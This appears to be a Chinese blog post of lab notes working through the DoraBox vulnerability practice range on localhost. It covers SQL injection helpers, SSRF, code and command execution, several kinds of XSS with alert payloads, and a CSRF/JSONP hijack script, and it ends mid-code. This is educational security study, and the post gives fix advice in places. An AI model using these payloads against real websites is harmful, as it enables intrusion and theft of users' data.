&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;mysql 字符拼接方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;concat()&lt;/p&gt;
&lt;p&gt;功能：将多个字符串连接成一个字符串&lt;/p&gt;
&lt;p&gt;语法：concat (str1, str2, …)&lt;/p&gt;
&lt;p&gt;说明：返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;concat_ws()&lt;/p&gt;
&lt;p&gt;功能：将多个字符串拼接成一个字符串，以自定义的符号进行分割&lt;/p&gt;
&lt;p&gt;语法：concat (separator, str1, str2, …)&lt;/p&gt;
&lt;p&gt;说明：第一个参数指定分隔符，若为 null, 返回结果也会为 null&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;group_concat()&lt;/p&gt;
&lt;p&gt;功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果&lt;/p&gt;
&lt;p&gt;语法：group_concat ([distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’] )&lt;/p&gt;
&lt;p&gt;说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 句子；separator 是一个字符串，缺省为一个逗号&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;information_schema&lt;/p&gt;
&lt;p&gt;information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括 “数据词典” 和 “系统目录”。&lt;/p&gt;
&lt;p&gt;常用表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;COLLATION_CHARACTER_SET_APPLICABILITY 表，和字符编码相关，包含的常用列：
&lt;ol&gt;
&lt;li&gt;COLLATION_NAME 排序规则明&lt;/li&gt;
&lt;li&gt;CHARACTER_SET_NAME 与排序规则关联的字符集的名称&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;TABLES 表，提供库中表信息，包含的常用列：
&lt;ol&gt;
&lt;li&gt;Table_catalog 数据表登记目录&lt;/li&gt;
&lt;li&gt;Table_schema 数据表所属的数据库名&lt;/li&gt;
&lt;li&gt;Table_name 表名&lt;/li&gt;
&lt;li&gt;Table_type 表类型 [system view | base table]&lt;/li&gt;
&lt;li&gt;Engine 使用的数据库引擎 [MyISAM | CSV | InnoDB]&lt;/li&gt;
&lt;li&gt;Version 版本，默认值 10&lt;/li&gt;
&lt;li&gt;Row_format 行格式 [Compact | Dynamic | Fixed]&lt;/li&gt;
&lt;li&gt;Table_rows 表里所存多少行数据 (早知道有这个，我就)&lt;/li&gt;
&lt;li&gt;Avg_row_length 平均行长度&lt;/li&gt;
&lt;li&gt;Data_length 数据长度&lt;/li&gt;
&lt;li&gt;Max_data_length 最大数据长度&lt;/li&gt;
&lt;li&gt;Index_length 索引长度&lt;/li&gt;
&lt;li&gt;Create_time 表的创建时间&lt;/li&gt;
&lt;li&gt;Update_time 表的更新时间&lt;/li&gt;
&lt;li&gt;Check_time 表的检查时间&lt;/li&gt;
&lt;li&gt;Table_collation 表的字符校验编码集&lt;/li&gt;
&lt;li&gt;Chechsum 校验和&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;COLUMNS 表，提供表中字段信息，包含的常用列：
&lt;ol&gt;
&lt;li&gt;TABLE_CATALOG 包含该列的表所属的目录名称。该值始终为 def。&lt;/li&gt;
&lt;li&gt;TABLE_SCHEMA 字段所在数据库的名称。&lt;/li&gt;
&lt;li&gt;TABLE_NAME 字段所在表的名称。&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;COLUMN_NAME 字段的名称。&lt;/li&gt;
&lt;li&gt;ORDINAL_POSITION 表中字段的位置。（可能会用 order by ORDINAL_POSITION）COLUMN_TYPE 字段数据类型。&lt;/li&gt;
&lt;li&gt;COLUMN_DEFAULT 字段的默认值。如果字段具有显示缺省值 NULL，或者字段定义不含 DEFAULT 子句，则该值为 NULL。&lt;/li&gt;
&lt;li&gt;COLUMN_TYPE 类型名称以及别的信息，比如精度或长度（以字符为单位&lt;/li&gt;
&lt;li&gt;CHARACTER_OCTET_LENGTH 对于字符串列，最大长度（以字节为单位&lt;/li&gt;
&lt;li&gt;CHARACTER_MAXIMUM_LENGTH 对于字符串列，最大长度（以字符为单位） COLUMN_KEY 名称是否已建立索引&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_ssrf001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;利用 file 进行文件读取&lt;img src=&#34;dorabox_ssrf002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;其实就是有 url 的，需要访问别的资源的就可能有 ssrf 漏洞。&lt;/li&gt;
&lt;li&gt;利用方式（里面好多没试过的，等我写完报告要去玩玩）
&lt;ol&gt;
&lt;li&gt;利用 file 协议读取本地文件（类似文件包含，想要利用这个漏洞，需要知道里面有什么文件或者目录，然后进行内容提取）&lt;/li&gt;
&lt;li&gt;对服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息&lt;/li&gt;
&lt;li&gt;攻击运行在内网或本地的应用程序&lt;/li&gt;
&lt;li&gt;对内网 web 应用进行指纹识别，识别企业内部的资产信息&lt;/li&gt;
&lt;li&gt;攻击内外网的 web 应用，主要是使用 HTTP GET 请求就可以实现的攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;任意代码执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意代码执行&#34;&gt;#&lt;/a&gt; 任意代码执行&lt;/h1&gt;
&lt;p&gt;根据题目提示，就是随便输代码，然后服务器执行脚本&lt;/p&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;phpinfo ()，查看 php 版本信息&lt;img src=&#34;dorabox_code002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;代码执行漏洞就是通过执行脚本代码，进行渗透&lt;/p&gt;
&lt;h1 id=&#34;任意命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意命令执行&#34;&gt;#&lt;/a&gt; 任意命令执行&lt;/h1&gt;
&lt;p&gt;根据题目提示，就是随便输命令&lt;/p&gt;
&lt;h2 id=&#34;过程-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-11&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;whoami，查看服务器信息&lt;img src=&#34;dorabox_cmd001.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-11&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;看源码是利用 exec () 函数，直接调用操作系统的命令&lt;/p&gt;
&lt;h1 id=&#34;反射xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反射xss&#34;&gt;#&lt;/a&gt; 反射 XSS&lt;/h1&gt;
&lt;p&gt;输入 12345678，查看源代码，发现服务器返回了输入的字符数统计，以及输入的字符串，在 html 中&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_ref001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-12&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;加入 js 代码，alert 一下&lt;img src=&#34;dorabox_xss_ref002.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-12&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;​	XSS 反射型，就是通过 get 或者 post 请求，被后台处理过数据，并响应到前端页面上。可以通过使用白名单过滤掉输入的恶意字符进行修复。&lt;/p&gt;
&lt;h1 id=&#34;存储型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#存储型xss&#34;&gt;#&lt;/a&gt; 存储型 XSS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-13&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;alert 试一下&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;payload&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;alert(&lt;span class=&#34;string&#34;&gt;&amp;quot;/XSS/&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;submit 后返回了字符数，没有 alert，刷新一下，重新加载，发现存储成功&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-13&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;存储型就是把用户输入的恶意字符串存储在服务器（数据库），一般在可以存储数据并会返回到前端代码的地方搞吧，别的用户点了，就会跳到小黑屋这种。或者利用一些平台脚本搞事情。&lt;/p&gt;
&lt;p&gt;漏洞修复：在服务端过滤掉 HTML 的尖括号，比如 php 的自带函数 strip_tags ()，然后对于一些可以执行的函数进行手动写函数过滤，过滤掉 onchange (),onload (),onclick (),onerror () 等等函数&lt;/p&gt;
&lt;h1 id=&#34;dom型xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom型xss&#34;&gt;#&lt;/a&gt; DOM 型 XSS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xss_sav001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-14&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;万能 alert，&lt;script&gt;alert(1)&lt;/script&gt;：&lt;img src=&#34;dorabox_xss_dom001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;带有 xss 的 url：&lt;a href=&#34;http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;amp;submit=submit&#34;&gt;http://localhost/dorabox/xss/dom_xss.php?name=&amp;lt;script&amp;gt;alert(1)&amp;lt;%2Fscript&amp;gt;&amp;amp;submit=submit&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;看源码是在这里打印的： &lt;code&gt;document.write(getURLValue(&#39;name&#39;));&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-14&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;DOM 型 xss，仅仅在前端页面进行操作的，通过修改页面的 DOM 节点形成的 XSS，效果和反射型类似。&lt;/p&gt;
&lt;p&gt;攻击者在 URL 中插入 XSS 代码，前端页面直接从 url 中获取 xss 代码并输出到页面，导致 xss 代码的执行，攻击者将带有 xss 代码的 url 发给用户，用户打开后收到攻击。&lt;/p&gt;
&lt;h1 id=&#34;csrf跨域资源&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf跨域资源&#34;&gt;#&lt;/a&gt; CSRF 跨域资源&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_json001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-15&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd,sex:CoolMan=&#34;&#34;&gt;
&lt;li&gt;
&lt;p&gt;构造 html 来劫持&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Ajax&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;Ajax 发送 get 请求&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ajax&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; xhr = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.responseType = &lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.open(&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://localhost/dorabox/csrf/userinfo.php&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.onreadystatechange= &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;e&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.status == &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;		alert(&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.responseText);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt; &amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;  xhr.send();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;ajax();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_ky001.png&#34; alt=&#34;&#34;&gt;内容：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-15&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;实话实说，这个就是借鉴网上的，解释一下js代码：

自定义ajax()方法并执行，ajax内创建XMLHttpRequest对象，设置回应内容的类型为text。

然后发送请求到服务器，其中 open(*method*,*url*,*async*)，第三个参数true为异步，异步 JavaScript 和 XML，XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true。

onreadystatechange：存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;0: 请求未初始化&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;1: 服务器连接已建立&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;2: 请求已接收&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;3: 请求处理中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;4: 请求已完成，且响应已就绪&lt;/p&gt;
&lt;p&gt;status	&lt;br&gt;
200: “OK”，404: 未找到页面&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后响应成功就 alert 返回的数据&lt;/p&gt;
&lt;p&gt;function ajax() {&lt;br&gt;
var xhr = new XMLHttpRequest();&lt;br&gt;
xhr.responseType = “text”;&lt;br&gt;
xhr.open(‘GET’, ‘&lt;a href=&#34;http://localhost/dorabox/csrf/userinfo.php&#34;&gt;http://localhost/dorabox/csrf/userinfo.php&lt;/a&gt;’, true);&lt;br&gt;
xhr.onreadystatechange= function(e) {&lt;br&gt;
if(this.status == 200){&lt;br&gt;
alert(this.responseText);&lt;br&gt;
}&lt;br&gt;
};&lt;br&gt;
xhr.send();&lt;br&gt;
}&lt;br&gt;
ajax();&lt;/p&gt;
&lt;h1 id=&#34;jsonp劫持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jsonp劫持&#34;&gt;#&lt;/a&gt; JSONP 劫持&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_csrf_json001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-16&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;来一个 csrf 攻击代码&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span 